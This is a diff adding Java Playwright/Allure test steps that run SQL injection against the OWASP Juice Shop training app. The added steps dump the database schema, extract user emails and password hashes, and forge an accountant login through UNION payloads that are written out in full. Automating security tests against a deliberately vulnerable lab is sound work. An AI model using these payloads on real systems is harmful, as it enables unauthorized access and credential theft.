@@ -343,6 +343,129 @@ public class SecurityPage {
         );
         return (String) result;
     }
+    @Step("Выполнить SQLi для извлечения схемы БД через поиск")
+    public SecurityPage extractDbSchema() {
+        String payload = "apple')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--";
+
+        Object response = page.evaluate(
+                "async (q) => { " +
+                        "  const res = await fetch('/rest/products/search?q=' + encodeURIComponent(q)); " +
+                        "  return { status: res.status, body: await res.text() }; " +
+                        "}",
+                payload
+        );
+
+        java.util.Map<?, ?> result = (java.util.Map<?, ?>) response;
+        int status = ((Number) result.get("status")).intValue();
+        String body = (String) result.get("body");
+        // Прикрепляем payload в Allure (для отчёта)
+        Allure.addAttachment(
+                "SQLi Payload",
+                "text/plain",
+                new ByteArrayInputStream(payload.getBytes(StandardCharsets.UTF_8)),
+                "txt"
+        );
+
+        // Прикрепляем JSON-ответ (доказательство)
+        Allure.addAttachment(
+                "SQLi Response: /rest/products/search",
+                "application/json",
+                new ByteArrayInputStream(body.getBytes(StandardCharsets.UTF_8)),
+                "json"
+        );
+
+        System.out.println(">>> SQLi Schema Status: " + status);
+        System.out.println(">>> Body (первые 500 символов): " + body.substring(0, Math.min(500, body.length())));
+
+        if (status != 200 || !body.contains("CREATE TABLE")) {
+            throw new AssertionError("SQLi не сработал: схема БД не извлечена. Статус: " + status);
+        }
+        System.out.println(">>> Схема БД успешно извлечена!");
+        return this;
+    }
+    @Step("Выполнить SQLi для извлечения учётных данных пользователей")
+    public SecurityPage extractUserCredentials() {
+        String payload = "apple')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--";
+
+        Object response = page.evaluate(
+                "async (q) => { " +
+                        "  const res = await fetch('/rest/products/search?q=' + encodeURIComponent(q)); " +
+                        "  return { status: res.status, body: await res.text() }; " +
+                        "}",
+                payload
+        );
+
+        java.util.Map<?, ?> result = (java.util.Map<?, ?>) response;
+        int status = ((Number) result.get("status")).intValue();
+        String body = (String) result.get("body");
+
+        // Прикрепляем payload и ответ в Allure
+        io.qameta.allure.Allure.addAttachment(
+                "SQLi Payload (Users)",
+                "text/plain",
+                new java.io.ByteArrayInputStream(payload.getBytes(java.nio.charset.StandardCharsets.UTF_8)),
+                "txt"
+        );
+        io.qameta.allure.Allure.addAttachment(
+                "SQLi Response: Users Credentials",
+                "application/json",
+                new java.io.ByteArrayInputStream(body.getBytes(java.nio.charset.StandardCharsets.UTF_8)),
+                "json"
+        );
+
+        System.out.println(">>> SQLi Users Status: " + status);
+        System.out.println(">>> Body (первые 500 символов): " + body.substring(0, Math.min(500, body.length())));
+
+        // Проверяем, что в ответе есть email и хэш пароля
+        if (status != 200
+                || !body.contains("admin@juice-sh.op")
+                || !body.contains("jim@juice-sh.op")) {
+            throw new AssertionError("SQLi не сработал: admin/jim не найдены. Статус: " + status);
+        }
+        System.out.println(">>> Учётные данные пользователей успешно извлечены!");
+        return this;
+    }
+    @Step("Выполнить SQLi Ephemeral Accountant: вход под фантомным бухгалтером")
+    public SecurityPage loginAsEphemeralAccountant() {
+        String payload = "' UNION SELECT * FROM (SELECT 1 as 'id', '' as 'username', " +
+                "'acc0unt4nt@juice-sh.op' as 'email', 'johndoe' as 'password', " +
+                "'accounting' as 'role', '' as 'deluxeToken', '0.0.0.0' as 'lastLoginIp', " +
+                "'/assets/public/images/uploads/default.svg' as 'profileImage', " +
+                "'' as 'totpSecret', 1 as 'isActive', '2019-05-10 16:15:00' as 'createdAt', " +
+                "'2026-01-05 16:15:00' as 'updatedAt', NULL as 'deletedAt')--";
+
+        Object response = page.evaluate(
+                "async (args) => { " +
+                        "  const [emailPayload, password] = args; " +
+                        "  const res = await fetch('/rest/user/login', { " +
+                        "    method: 'POST', " +
+                        "    headers: { 'Content-Type': 'application/json' }, " +
+                        "    body: JSON.stringify({ email: emailPayload, password: password }) " +
+                        "  }); " +
+                        "  return { status: res.status, body: await res.text() }; " +
+                        "}",
+                java.util.List.of(payload, "any_password")
+        );
+
+        java.util.Map<?, ?> result = (java.util.Map<?, ?>) response;
+        int status = ((Number) result.get("status")).intValue();
+        String body = (String) result.get("body");
+
+        io.qameta.allure.Allure.addAttachment("Ephemeral Accountant Payload", "text/plain",
+                new java.io.ByteArrayInputStream(payload.getBytes(java.nio.charset.StandardCharsets.UTF_8)), "txt");
+        io.qameta.allure.Allure.addAttachment("Login Response", "application/json",
+                new java.io.ByteArrayInputStream(body.getBytes(java.nio.charset.StandardCharsets.UTF_8)), "json");
+
+        System.out.println(">>> Ephemeral Accountant Status: " + status);
+        System.out.println(">>> Body: " + body.substring(0, Math.min(500, body.length())));
+
+        // Проверяем, что в ответе есть токен (authentication.token)
+        if (status != 200 || !body.contains("token")) {
+            throw new AssertionError("Ephemeral Accountant не сработал: токен не получен. Статус: " + status);
+        }
+        System.out.println(">>> Вход под фантомным бухгалтером выполнен!");
+        return this;
+    }
 
 
 
